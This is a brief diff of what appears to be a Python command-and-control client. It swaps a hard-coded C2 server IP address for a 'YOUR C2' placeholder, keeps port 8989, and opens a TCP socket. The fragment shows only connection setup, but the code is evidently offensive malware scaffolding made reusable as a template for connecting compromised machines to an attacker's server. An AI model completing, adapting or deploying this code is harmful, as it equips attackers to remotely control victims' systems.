@@ -1,6 +1,6 @@
 import socket, sys
 
-C2 = "45.55.18.16"
+C2 = "YOUR C2"
 C2PORT = 8989
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
